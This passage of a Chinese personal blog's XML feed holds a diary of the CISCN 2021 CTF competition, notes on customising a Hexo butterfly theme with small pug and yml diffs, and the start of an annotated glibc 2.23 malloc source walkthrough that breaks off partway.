<code>查看投稿</code> 指令查看</li><li>再次修复 <code>梗百科</code> 模块</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> 开发 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CISCN2021参赛纪行</title>
      <link href="/2021/07/19/CISCN2021%E5%8F%82%E8%B5%9B%E7%BA%AA%E8%A1%8C/"/>
      <url>/2021/07/19/CISCN2021%E5%8F%82%E8%B5%9B%E7%BA%AA%E8%A1%8C/</url>
      
        <content type="html"><![CDATA[<p>今年的国赛是以学校名义去打的，队伍名是 fr3e，和我一个队的还有 web 狗 Dem0，pwn 佬 now4yreal 和 Wi1L</p><h2 id="初赛"><a href="#初赛" class="headerlink" title="初赛"></a>初赛</h2><p>比赛时间是 5 月 15、16 号，初赛延续了以往的传统，上午 9 点到 11 点先整了两个小时的知识问答，150 道单选，50 道多选。基本一问三不知，每次做完都会怀疑自己究竟是不是信安专业的</p><p><img src="/img/article/20210719/1.png" alt="知识问答"></p><p>然后是强度拉满的 22 小时 CTF（15 号 11 点到 16 号早上 9 点），当时是有事在天津，我缩在酒店里打了一天。第二天早上 9 点硬着头皮去航母主题公园参加学校的团建，人走在路上都要睡着了，但是看到了很多在舰 R 里认识的船，还被路边一个像老虎机的东西骗了 10 块钱，也是不虚此行了</p><p>具体说说 CTF 的参赛经历吧。整活还得看国赛，今年的赛制依旧发挥稳定，没有让人失望，来欣赏一下 360 定的操作手册：</p><p><img src="/img/article/20210719/2.png" alt="初赛"></p><p>三张卷子的名字也很搞：</p><p><img src="/img/article/20210719/3.png" alt="初赛"></p><p><img src="/img/article/20210719/4.png" alt="初赛"></p><p><img src="/img/article/20210719/5.png" alt="初赛"></p><p>在 b 乎上收了一张十分形象的图：</p><p><img src="/img/article/20210719/6.jpg" alt="初赛"></p><p>大家都调侃今年是 CTF 高考元年，喷的较为理性的有两点，作为当事人感触很深</p><ul><li>阴间的放题时间及强制熬夜打比赛</li><li>py 现象还是没有改善</li></ul><p>作为一个超高校级划水逆向，三张卷子有 5 道 re，只会做 3 道</p><ol><li>签到：忘了反正挺简单的</li><li>golang：没有符号，恢复的脚本跑不通，没有 IDA 7.6，花两个小时找到核心逻辑。嗯，有几万次的递归，递归完会直接输出 flag，不会优化，卒</li><li>ruby：之前接触过，把虚拟文件系统提取出来拿到 ruby 脚本，还能做</li><li>baby.bc：这东西是啥？哦，llvm 编译的中间产物，工具链装一下，编译成 elf。IDA 分析，是一个条件更苛刻的幻方，不会算法，手填</li><li>HMI：C# 写的工控题，modbus 协议没搞过，我甚至无法让题目中的那些仪器和观测值动起来，抬走</li></ol><p>熬到 4 点钟实在是肝不动了，当时都放弃 HMI 在做 misc 了，没想到还整出来一道，于是直接躺平睡到比赛结束去团建（事实是提前起来补写 wp）。好在可靠的队友其他方向都解了很多题，将我抬进了分区赛，也感谢其他队的师傅们高抬贵手，py 都是点到为止（虽然最后 10 分钟的冲分场面依旧很壮观），甚至有人 py 到了作品赛的群 233</p><p><img src="/img/article/20210719/7.jpg" alt="初赛"></p><p>但有的师傅就没有这么幸运了</p><p><img src="/img/article/20210719/8.png" alt="初赛"></p><p>比赛规定一个学校最多进两个队，北邮包揽了全国的一二三名，导致出现全国第三无缘复赛的尴尬场面，最后天璇（成员都是研究生往上）主动退出，让还都是本科生的天枢和 Flybugs 进了复赛</p><br><h2 id="分区赛"><a href="#分区赛" class="headerlink" title="分区赛"></a>分区赛</h2><p>比赛时间是 6 月 26、27 两天，今年的分区赛来到了去年的决赛场所 —— 华中科技大学。不得不说，第一所网安基地还是有牌面啊，这次的比赛场地不是网安学院旁边的那个大展馆了，而是黄鹤网络攻防实验室，技术支持是绿盟</p><p><img src="/img/article/20210719/9.png" alt="分区赛"></p><p>赛制的话，第一天是 CTF，第二天是 AWD</p><p>CTF 的题目难度分布着实有些迷，我一个 re，把 misc AK 了，还和 web 手一起做了两个 crypto，然后 re 只解了一道……最让我无法接受的是比赛过程中<strong>禁止使用手机</strong>，然后 re 里出了两道 apk？？？模拟器又装不上，调都没法调试，最后两道 apk，一道 1 解，一道 0 解，很迷</p><p>做完第一道 re，我纯静态看了俩小时 apk，决定放弃，直接打开也是 0 解的分值最高的一道 re。看了一会儿发现可以做，就是校验 flag 的逻辑比较长，它把输入分为了三段来分别检查，一通操作 + 动调后，解出前两段，抬头看时间，只剩 10 分钟，卒</p><p>第二天打 AWD，9 点开赛，先 fix（加固） 40 分钟，再互相打，不出所料平台崩了。其实在 8 点 40 左右测试环境的时候，就很难登上平台了，每次刷新需要等待的时间越来越长。9 点正式开赛，有的人能访问平台，拿到 ssh 账号密码，绝大部分的人都还在等浏览器的圈圈转，早登进平台的人把题目下下来已经开始找后门、修洞了，我们这边还在显示 <code>您的战队已被禁赛</code></p><p>给绿盟现场运维反映了很多次，无果，他们选择摆烂。时间来到了 9 点半，别的队伍对于平台的访问情况有所好转，现场就我们和隔壁桌的两个队还显示被禁赛，这时候主持人来了句 “10 分钟后开放端口，选手开始攻击”，我直接绷不住了，别人都修了 30 分钟的洞，写了 30 分钟的脚本了，我连题都还没看到，你给我说 10 分钟以后别人要开始干我了？？？</p><p>我们再次向运维反映问题，因为其他队的网络情况恢复得差不多了，他们总算是有时间搭理我们了。然后他们说问题的原因是数据库的记录加错了，我都无力吐槽，我奶奶的数据库用得都比你绿盟明白</p><p>既然恢复正常了，那就登平台拿 ssh 上号吧，毕竟比赛还在进行，这些皮可以等结束以后再扯。等我们登上平台，又是一阵意想不到的惊喜，所有队伍的靶机 ssh 用户名和密码都是 ctf。不出意料，我们的两台 pwn 机登录密码被早就登上平台的其他人改了，联系运维重置环境又耽误了一段时间</p><p>web 这边已经炸了，靶机上全是马，于是我和队内 web 手转变策略，先只攻不防，等到得分稳定了再开始删马。因为这个时候审洞已经来不及了，所以我们上了个流量监测，开始抄流量，并套用之前准备的脚本，用别人的马种我们的马，总算是保住了一些分</p><p>那几个小时很折磨，颁奖之前对于到底能不能进决赛这件事心里也没个底，最后结果出来我们是第 12 名，前 13 支队伍都是一等奖，都可以进决赛，我们才没有找绿盟扯皮</p><p>后来和别的队交流，我和 Dem0 发现我们 AWD 时少打了一半的队，因为绿盟没有给其他队伍的靶机 ip，需要自己去扫，我们只扫了本网段的，谁知道附近网段还有靶机，这样还能进决赛属实是师傅们抬了一手</p><p>总之，这场比赛打得很糟心，隔壁桌的一个师傅打完直接哭了，他们也是被绿盟搞到 9 点 40 才登上平台。除此之外，比赛规定里写着禁止电子设备联网，现场却连个屏蔽器都没有，你是真当打 CTF 的个个都很自觉？和别的队交流的时候才知道他们在 CTF 环节网上冲浪得不要太爽，有的队在裁判组眼皮子底下上网、传题，都没被发现。他们那些队不要脸已经不是一次两次了，但为什么每次规则里明令禁止的东西，在现场监督时，却看不到承办方给予应有的重视呢？</p><br><h2 id="决赛"><a href="#决赛" class="headerlink" title="决赛"></a>决赛</h2><p>比赛时间是 7 月 17、18 号，地点是哈工大 1 校区体育馆。早就听哈工大的同学说他们那边教室、寝室没有空调，去之前还担心会不会太热，过去之后才发现这些担心都是多余的 —— 至少体育馆和酒店是有空调的。决赛的技术支持是安恒提供的，赵总、Guoke 等大佬都在后台运维，全程无尿点，平台稳定得一 b，flag 提交接口一点也不卡，简直爱了</p><p><img src="/img/article/20210719/9.jpg" alt="决赛"></p><p>在学校特殊情况特殊处理后，本来本科生不能上天的我们坐飞机去了哈尔滨（机票比高铁还便宜）。16 号晚上入住后，我偷偷溜出来和哈工大的同学（之前高中一个班的）去了哈尔滨有名的金刚山烧烤店吃串，串挺好吃的，见图：</p><div class="hide-block"><button type="button" class="hide-button button--animated" style="">点击查看图片    </button><div class="hide-content"><p><img src="/img/article/20210719/10.jpg" alt="决赛"></p></div></div><p>就是有点废耳朵，音响就在我头的正上方</p><div class="hide-block"><button type="button" class="hide-button button--animated" style="">点击查看视频    </button><div class="hide-content"><video src='/video/article/20210719/1.mp4' type='video/mp4' controls='controls'  width='100%' height='100%'></video></div></div><p>17 号上场比赛的时候，我的右边耳朵几乎听不见声音，突发性耳聋属于是。不过无所谓，正好听不见赛场里无脑循环的两首 BGM</p><p>第一天的 AWD 挺稳的，虽然依旧难以审洞，但靠着主办方提供的流量也能做到题目全解，除了第一个小时，其他时间脚本一直在跑，分也渐渐攀升，排名在 18 附近波动</p><p>但是第一天的赛制除了 AWD，还有一个解题模式，做的是可信计算相关的题，还挺新颖。一共放了三道，只会做第一道。本来一开始看这个模式的名字我们都不想碰的，但后来我看做出来第一题的队伍越来越多，而且题目的分值很高，在安顿好 web4 之后，我就抽出身来研究可信计算</p><p>第一道是关于 blp 权限控制模型的，根据题目 pdf 的描述来补全权限控制框架，仔细读一遍题目要求再读读框架中已有的代码，理解意思之后，几行就能写出来，确实不是很难</p><p>第二和第三道是关于中间人攻击的，场景是 Alice 通过中转站向 Bob 发送加密文件，明文的文件是被一个随机数加密的，这个随机数会被 Alice 产生的公钥加密后发给 Bob，同时 Alice 也会给 Bob 发送她的公钥。攻击者扮演中间人，可以 hook 中转站的一些消息发送、接收的函数，只要能通过劫持的信息还原出明文文件，并欺骗 Alice 和 Bob，让他们认为双方在正常沟通，就能得到 flag</p><p>第二题我写完以后本地测试是对的，连上题目服务器测试死活不对，唉，只能说 GG</p><p>最后 AWD 和可信计算的分按规则加起来后，我们排到了 31 名，第一天的分数占总成绩的 70%，可以说基本奠定大局</p><p>晚上在哈工大同学的带领下，体会了一次铁锅炖，以及哈尔滨特有的正宗秋林-格瓦斯：</p><p><img src="/img/article/20210719/11.jpg" alt="决赛"></p><p>差点忘了中央大街的马迭尔冰棍：</p><p><img src="/img/article/20210719/12.jpg" alt="决赛"></p><p>第二天就是一上午的 Break &amp; Fix，即 CTF。4 道 web、3 道 pwn，时间只有三小时。我和 Dem0 一直在看 easy_python 那道 ssti 模板攻击，很早就把 waf 绕过去，都读到题目源码和根目录下的所有文件了，我们甚至能查看 /etc/passwd 的内容，可就是无法查看 /flag.txt 的内容，想尽一切办法恢复被剔除的 subprocess 模块，但似乎恢复了还是不能直接读 flag，然后那道题果然到最后还是 0 解……</p><p>break 环节结束时，队里的 pwn 佬出了一道，然后我们 fix 把 easy_python 和出的那道 pwn 修好了，第二天的排名挺靠前的，奈何第二天的成绩只占 15%，终究只使得我们在总排名上较第一天前进了一名，喜提国二</p><p>总的来说，安恒的比赛打得很舒服，题目质量不错，运维专业团队，32 台服务器足以体现安恒对于比赛的重视，这才叫技术支持，希望有的公司好好看，好好学</p><p>第二天晚上的话，是华为赞助的晚宴，最后有抽奖环节，三等奖是手环或智能摄像头，二等奖是 FreeBuds，一等奖是 GT2 Pro 手表，特等奖是 Mate 40 手机，我拿到的是 19 号：</p><p><img src="/img/article/20210719/13.jpg" alt="决赛"></p><p>然后又是 50% 中奖率我啥也没抽到，和去年的剧情一样，麻了。晚宴还没吃饱，凌晨又点了个外卖，香！</p><p><img src="/img/article/20210719/14.jpg" alt="决赛"></p><br><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这几场打下来，还是安恒支持的比赛体验更好，其实其他的安全公司完全没必要在赛程中专门拿个 PPT 来见缝插针地介绍自己，办好每场比赛，给选手们好的体验，才是最好的广告。有的公司非要和选手站在对立面，用一种爱要不要的摆烂心态来面对选手需求和质疑，我就想知道，b 乎上不挂你挂谁？</p><p>另外，AWD 我还是菜啊，一定是我流量抄得不够快，正好准备用一年时间开发一个 AWD 攻击框架，不想再当脚本小子了 555</p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> 生活 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>关于博客主题更新的二三事</title>
      <link href="/2021/07/09/%E5%85%B3%E4%BA%8E%E5%8D%9A%E5%AE%A2%E4%B8%BB%E9%A2%98%E6%9B%B4%E6%96%B0%E7%9A%84%E4%BA%8C%E4%B8%89%E4%BA%8B/"/>
      <url>/2021/07/09/%E5%85%B3%E4%BA%8E%E5%8D%9A%E5%AE%A2%E4%B8%BB%E9%A2%98%E6%9B%B4%E6%96%B0%E7%9A%84%E4%BA%8C%E4%B8%89%E4%BA%8B/</url>
      
        <content type="html"><![CDATA[<h2 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h2><p>作为包豪斯风格的一贯推行者，当初在挑选 hexo 的主题时，我一眼就相中了 yilia，先放一张原主题的官方概念图：</p><p><img src="/img/article/20210709/1.gif" alt="yilia"></p><p>不管在电脑端还是在移动端，这个主题都适配得非常好，简洁大方，低调又不失 b 格。所以自 gitpage 开通至今的一年多时间里，我一直都用着 yilia，也从来没有过更换主题的想法，毕竟光是写文章都老费劲了……直到我遇到了 butterfly 主题，那种震撼感和我初识 hexo 一样</p><p>其实在用 hexo 之前（大一），我都不知道有博客前端框架这种东西，凭着自己下饭的 web 知识和面向 cv 编程后，手撸了一个站出来，想看的话可以点开来看一下</p><div class="hide-block"><button type="button" class="hide-button button--animated" style="">别看，要脸    </button><div class="hide-content"><p><img src="/img/article/20210709/2.gif" alt="old_blog"></p></div></div><p>当时甚至实现了评论区和说说的功能，然后买了个浓茗学生云，注册了个浓茗域名，去公安局喝了一杯茶，我就拥有了属于自己的浓茗博客。因为不懂优化，几十兆的东西（歌、图啥的）就硬往 onload 里塞，用起来怎一个卡字了得</p><p>后来开始逛一些师傅の博客，觉得他们好牛啊，前端写得真漂亮，访问速度也很快，只是一直不解为什么他们的域名最后都是 github.io。然后我接二连三地看到前端长得贼像的其他博客，大家都是 github.io 域的，我便开始怀疑这东西是不是一个项目啊？是不是拉到页面底部经常能看到的那个 <code>Powered by hexo</code>？</p><p>于是那一夜，我理解了很多事情……我才知道原来那个域是专门拿来搞 gitpage 的，才知道有 hexo 这么好的框架，才知道自己原来是个浓茗。然后就发生了文章开头的一幕，yilia 从选妃中脱颖而出，这便是我の博客的第一次大改</p><p>一年过去了，还是在逛别的师傅の博客时，看到别人前端攻城狮の博客整的是有声有色，各种花里胡哨的组件和动效给我整麻了。还有一个师傅（akilar）的页面上右键可以调出 SAO 的菜单，就这种：</p><p><img src="/img/article/20210709/3.png" alt="SAO_menu"></p><p>这我一个中二晚期哪里顶得住，再看看自己的博客（此时是还是 yilia 主题），安静得让我直接在蚌埠买房。于是我决定把第二次大改提上议程，并选择了 akilar 师傅同款主题 —— butterfly</p><br><h2 id="经过"><a href="#经过" class="headerlink" title="经过"></a>经过</h2><p>本着追求刺激就贯彻到底的理念，我列出了一个 todo list</p><div class="hide-toggle" ><div class="hide-button toggle-title" style=""><i class="fas fa-caret-right fa-fw"></i><span>施工清单</span></div>    <div class="hide-content"><blockquote><p>已完成</p></blockquote><ul><li>为所有文章添加封面、描述</li><li>修改所有文章的文章结构，使其适配文章目录侧边栏</li><li>删除所有文章中原主题的 more 标签</li><li>挂掉的百度云网盘链接更新</li><li>修改 butterfly 对于文章版权部分的逻辑，增添 <strong>封面画师</strong> 一项</li><li>修改资料卡中的按钮逻辑使其支持 snackbar 弹窗</li><li>删除文章中存在的不合理的 <code>**</code></li><li>删除文章中不合理的 <code>&lt;br&gt;</code> 标签</li><li>修改博客封面与个人介绍</li><li>清除没有必要的 tag</li><li>增加标签页面</li><li>增加链接页面<ul><li>友链</li><li>安全资讯</li><li>工具网站</li></ul></li><li>增加娱乐页面<ul><li>番剧</li></ul></li><li>修改加载动画</li><li>页脚美化</li></ul><blockquote><p>待完成</p></blockquote><ul><li>增加说说页面</li><li>增加娱乐页面<ul><li>音乐（开发插件中）</li></ul></li><li>绑定自定义域名</li><li>设置自动提交 url 至搜索引擎</li><li>Aplayer + Pjax 添加底部音乐播放器</li><li>使用 gulp 打包</li><li>支持 PWA</li></ul></div></div><p>过程中改了非常多的地方（markdown 内容、找封面、目录结构、butterfly 主题的代码），以至于这次主题更新花了我三天的时间。虽然还有一部分事情没有做，但我准备先上线，放置一段时间再弄（绝对不是因为期末考试周</p><p>在更新主题的过程中也有了一些经验，这里记录一下</p><h3 id="关于文章封面"><a href="#关于文章封面" class="headerlink" title="关于文章封面"></a>关于文章封面</h3><p>对于每篇文章，我都精心挑选了一张图片作为封面。一般想不到配啥图的，都是在 pixiv 上现找，搜索用到的关键词是 <code>風景10000users入り</code>，然后满足图片的宽高比在 2 : 1 附近就行</p><p>图是找到了，那总不能白嫖吧，我想着起码得找个地方放上画师个人主页的链接。放在文章末尾加个 PS. 标注确实可行，不过很捞，想想每篇文章结束后专门有一个地方来放版权声明：</p><p><img src="/img/article/20210709/5.png" alt="copyright"></p><p>把画师 ID 加在这里面不就行了吗？空间完美利用，nice！</p><p>翻了一下 butterfly 的目录，发现 html 是用 pug 模板引擎来生成的，与文章版权声明版块有关的文件是 <code>%HEXO_ROOT%\themes\butterfly\layout\includes\post\post-copyright.pug</code> ，添加如下代码</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">    - let authorHref = page.copyright_author_href ? page.copyright_author_href : `mailto:$&#123;config.email&#125;`</span><br><span class="line">    - let url = page.copyright_url ? page.copyright_url : page.permalink</span><br><span class="line">    - let info = page.copyright_info ? page.copyright_info : _p(&#x27;post.copyright.copyright_content&#x27;, theme.post_copyright.license_url, theme.post_copyright.license, config.url, config.title)</span><br><span class="line"><span class="addition">+   - let caid = page.cover_authorid</span></span><br><span class="line"><span class="addition">+   - let caHref = `https://www.pixiv.net/users/$&#123;caid&#125;`</span></span><br><span class="line">    .post-copyright</span><br><span class="line">      .post-copyright__author</span><br><span class="line">        span.post-copyright-meta= _p(&#x27;post.copyright.author&#x27;) + &quot;: &quot;</span><br><span class="line">        span.post-copyright-info</span><br><span class="line">          a(href=authorHref)=author</span><br><span class="line"><span class="addition">+     if caid</span></span><br><span class="line"><span class="addition">+       .post-cover__authorid</span></span><br><span class="line"><span class="addition">+         span.post-copyright-meta= _p(&#x27;post.copyright.cover_author&#x27;) + &quot;: &quot;</span></span><br><span class="line"><span class="addition">+         span.post-copyright-info</span></span><br><span class="line"><span class="addition">+           a(href=caHref)=caid</span></span><br><span class="line">      .post-copyright__type</span><br><span class="line">        span.post-copyright-meta= _p(&#x27;post.copyright.link&#x27;) + &quot;: &quot;</span><br><span class="line">        span.post-copyright-info</span><br></pre></td></tr></table></figure><p>修改 <code>%HEXO_ROOT%\themes\butterfly\languages\zh-CN.yml</code>（我的网站语言是简体中文，如果你的是繁体或者英语，就对应修改 zh-TW.yml 或 en.yml） </p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">post:</span><br><span class="line">  created: 发表于</span><br><span class="line">  updated: 更新于</span><br><span class="line">  wordcount: 字数总计</span><br><span class="line">  min2read: 阅读时长</span><br><span class="line">  min2read_unit: 分钟</span><br><span class="line">  page_pv: 阅读量</span><br><span class="line">  comments: 评论数</span><br><span class="line">  copyright:</span><br><span class="line">    author: 文章作者</span><br><span class="line">    link: 文章链接</span><br><span class="line">    copyright_notice: 版权声明</span><br><span class="line">    copyright_content: &#x27;本博客所有文章除特别声明外，均采用</span><br><span class="line">      &lt;a href=&quot;%s&quot; target=&quot;_blank&quot;&gt;%s&lt;/a&gt; 许可协议。转载请注明来自 &lt;a href=&quot;%s&quot; target=&quot;_blank&quot;&gt;%s&lt;/a&gt;！&#x27;</span><br><span class="line"><span class="addition">+   cover_author: 封面画师</span></span><br><span class="line">  recommend: 相关推荐</span><br><span class="line">  edit: 编辑</span><br></pre></td></tr></table></figure><p>然后只需要在使用了 p 站图的 markdown 元信息里写下 cover_authorid 的键值对：</p><p><img src="/img/article/20210709/6.png" alt="copyright"></p><p>就能看到画师信息已经添加上去了：</p><p><img src="/img/article/20210709/7.png" alt="copyright"></p><p>至于整个博客的封面，我一开始想用下面这张图的动图版（后面因为文件太大放弃了）</p><p><img src="/img/article/20210709/4.png" alt="top_img"></p><p>可是 pixiv 的动图不是 gif 格式的一个文件，而是写了一个动图播放器，从后台接口把一张张图片下载下来播放，怎么把 pixiv 上的动图抓下来，我后面会专门写一篇文章来介绍</p><br><h3 id="关于资料卡按钮"><a href="#关于资料卡按钮" class="headerlink" title="关于资料卡按钮"></a>关于资料卡按钮</h3><p>原本资料卡里的按钮的逻辑是按下去就打开一个你配置好的链接</p><p><img src="/img/article/20210709/8.png" alt="card"></p><p>我看别的师傅这个按钮都是按下去有个 alert 或者弹一个 snackbar，总之能执行一段 js 逻辑。但我找不到这个配置项，所以只能自己乱改了，修改 <code>%HEXO_ROOT%\themes\butterfly\layout\includes\widget\card_author.pug</code>的一行：</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">    if theme.aside.card_author.button.enable</span><br><span class="line"><span class="deletion">-     a#card-info-btn.button--animated(href=theme.aside.card_author.button.link)</span></span><br><span class="line"><span class="addition">+     a#card-info-btn.button--animated(href=&quot;javascript:void(0);&quot;, onclick=&#x27;btf.snackbarShow(&quot;&#x27;+ _p(&#x27;bookmark&#x27;) +&#x27;&quot;)&#x27;)</span></span><br><span class="line">        i(class=theme.aside.card_author.button.icon)</span><br><span class="line">        span=theme.aside.card_author.button.text</span><br></pre></td></tr></table></figure><p>然后同样在 <code>%HEXO_ROOT%\themes\butterfly\languages\zh-CN.yml</code> 语言配置文件中添加一项：</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">error404:</span><br><span class="line">  error_title: 页面没有找到</span><br><span class="line">  back_button: 回到主页</span><br><span class="line"></span><br><span class="line"><span class="addition">+bookmark: 按下 Ctrl + D 即可添加收藏哦！</span></span><br></pre></td></tr></table></figure><br><h3 id="注入自定义-css-或-js"><a href="#注入自定义-css-或-js" class="headerlink" title="注入自定义 css 或 js"></a>注入自定义 css 或 js</h3><p>以 js 为例，要添加自己的 js 文件，并希望网页加载，需要修改 butterfly 的配置文件 config.yml，在 inject 下加入 html 语句：</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">inject:</span></span><br><span class="line">  <span class="attr">head:</span></span><br><span class="line">    <span class="comment"># - &lt;link rel=&quot;stylesheet&quot; href=&quot;/xxx.css&quot;&gt;</span></span><br><span class="line">  <span class="attr">bottom:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">&lt;script</span> <span class="string">defer</span> <span class="string">src=&quot;https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js&quot;&gt;&lt;/script&gt;</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">&lt;script</span> <span class="string">defer</span> <span class="string">src=&quot;/js/modify.js&quot;&gt;&lt;/script&gt;</span></span><br></pre></td></tr></table></figure><p>支持添加到 head（<code>&lt;/body&gt;</code> 標籤之前）和 bottom（<code>&lt;/html&gt;</code> 標籤之前），之后在对应目录下创建 js 即可，例如这里是 <code>%HEXO_ROOT%\themes\butterfly\source\js\modify.js</code></p><br><h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><p>总之，主题是马马虎虎地改完了，后面还会增加说说页面，也会为了展示网易云音乐而编写一个 hexo 的插件，url 提交到搜索引擎的事也会等我买到心仪域名的时候再做（纯自嗨），咕咕咕（飞走</p>]]></content>
      
      
      
        <tags>
            
            <tag> 生活 </tag>
            
            <tag> hexo </tag>
            
            <tag> 前端 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第一次malloc都发生了什么？</title>
      <link href="/2021/03/13/%E7%AC%AC%E4%B8%80%E6%AC%A1malloc%E9%83%BD%E5%8F%91%E7%94%9F%E4%BA%86%E4%BB%80%E4%B9%88%EF%BC%9F/"/>
      <url>/2021/03/13/%E7%AC%AC%E4%B8%80%E6%AC%A1malloc%E9%83%BD%E5%8F%91%E7%94%9F%E4%BA%86%E4%BB%80%E4%B9%88%EF%BC%9F/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>本文通过为 glibc 2.23 malloc 源码添加注解的形式，详细阐述了程序第一次 malloc 时，从进入 malloc 函数到返回一个地址的过程中都经历了什么，对于高版本的 ptmalloc 也可以按照本文的思路和方法来调试分析。这里默认读者具备 malloc 系统的基本概念，知晓 malloc_chunk、malloc_state、malloc_par 等常见堆相关结构体的字段含义</p><br><h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><img src="../img/3.png" alt="env" style="zoom: 80%;" /><br><h2 id="测试代码"><a href="#测试代码" class="headerlink" title="测试代码"></a>测试代码</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// gcc -m32 -no-pie -o test test.c</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">20</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>推荐下载 glibc 2.23 源码，对照 malloc/ 目录下文件来阅读本文，下面进入正片</p><br><h2 id="流程跟踪"><a href="#流程跟踪" class="headerlink" title="流程跟踪"></a>流程跟踪</h2><p>malloc.c 中无法找到 malloc 的直接实现，只有 __libc_malloc，而 malloc 实际上是它的别名：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strong_alias (__libc_malloc, __malloc) strong_alias (__libc_malloc, <span class="built_in">malloc</span>)</span><br></pre></td></tr></table></figure><p>调用 malloc  其实就是在调用 __libc_malloc，函数代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> *</span><br><span class="line">__libc_malloc (<span class="keyword">size_t</span> bytes)</span><br><span class="line">&#123;</span><br><span class="line">  mstate ar_ptr;</span><br><span class="line">  <span class="keyword">void</span> *victim;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">void</span> *(*hook) (<span class="keyword">size_t</span>, <span class="keyword">const</span> <span class="keyword">void</span> *)</span><br><span class="line">    = atomic_forced_read (__malloc_hook);</span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect (hook != <span class="literal">NULL</span>, <span class="number">0</span>))</span><br><span class="line">    <span class="keyword">return</span> (*hook)(bytes, RETURN_ADDRESS (<span class="number">0</span>));</span><br><span class="line"></span><br><span class="line">  arena_get (ar_ptr, bytes);</span><br><span class="line"></span><br><span class="line">  victim = _int_malloc (ar_ptr, bytes);</span><br><span class="line">  <span class="comment">/* Retry with another arena only if we were able to find a usable arena</span></span><br><span class="line"><span class="comment">     before.  */</span></span><br><span class="line">  <span class="keyword">if</span> (!victim &amp;&amp; ar_ptr != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      LIBC_PROBE (memory_malloc_retry, <span class="number">1</span>, bytes);</span><br><span class="line">      ar_ptr = arena_get_retry (ar_ptr, bytes);</span><br><span class="line">      victim = _int_malloc (ar_ptr, bytes);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (ar_ptr != <span class="literal">NULL</span>)</span><br><span class="line">    (<span class="keyword">void</span>) mutex_unlock (&amp;ar_ptr-&gt;mutex);</span><br><span class="line"></span><br><span class="line">  assert (!victim || chunk_is_mmapped (mem2chunk (victim)) ||</span><br><span class="line">          ar_ptr == arena_for_chunk (mem2chunk (victim)));</span><br><span class="line">  <span class="keyword">return</span> victim;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>由于全局变量 __malloc_hook 被赋予初值 malloc_hook_ini：</p><figure class="highlight c"><table><tr><td 